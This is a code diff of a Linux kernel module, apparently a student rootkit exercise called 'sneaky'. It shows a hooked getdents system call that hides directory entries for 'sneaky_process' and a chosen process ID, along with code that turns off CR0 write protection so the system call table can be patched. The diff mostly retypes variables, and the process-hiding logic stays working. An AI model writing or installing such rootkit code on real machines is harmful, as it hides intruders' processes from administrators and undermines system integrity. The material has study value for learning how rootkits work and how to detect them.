@@ -17,13 +17,12 @@
 #define write_cr0(x) (native_write_cr0(x))
 
 
-#define BUFFLEN 512
+#define BUFFLEN 256
 MODULE_LICENSE("rg239");
 
-
-static char * sneaky_process_id = "";
-module_param(sneaky_process_id, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
-MODULE_PARM_DESC(sneaky_process_id, "sneaky_process pid");
+static char * sneaky_process_id = "00000000";
+module_param(sneaky_process_id, charp, 0);
+MODULE_PARM_DESC(sneaky_process_id, "A character string");
 
 
 //getdents will fill in an array of “struct linux_dirent” objects, one for each file or directory found within a directory. 
@@ -76,25 +75,30 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
+  // char sneaky_id[40];
+  // sprintf(sneaky_id, "%d", sneaky_process_id);
+
     int num = original_getdents(fd, dirp, count);
     struct linux_dirent * current_dir;
     int current_position = 0;
-    int current_reclen,  length;
+    int current_reclen;
+    size_t length;
 
     while(current_position < num && current_position >= 0){
 
       current_dir = (struct linux_dirent *)(current_position + (char*)dirp);
-      current_reclen = current_dir->d_reclen;
+      current_reclen = (int)current_dir->d_reclen;
 
       if((strcmp(current_dir->d_name, "sneaky_process") == 0) || (strcmp(current_dir->d_name, sneaky_process_id) == 0)){
 
-        length  = num - (size_t)(((char *)current_dir + current_dir->d_reclen) - (char*)dirp);
+        length = (size_t)( num - (size_t)(((char *)current_dir + current_dir->d_reclen) - (char*)dirp));
         memcpy(current_dir, (char*)current_dir + current_dir->d_reclen, length);
 	num = num - current_reclen;
 	break;
       }
       current_position = current_position + current_reclen;
-    }
+
+    } //loop ends
     
     return num;
     
@@ -110,6 +114,7 @@ static int initialize_sneaky_module(void)
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
+  // printk(KERN_INFO "sneaky_process pid is: %s\n", sneaky_process_id);
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
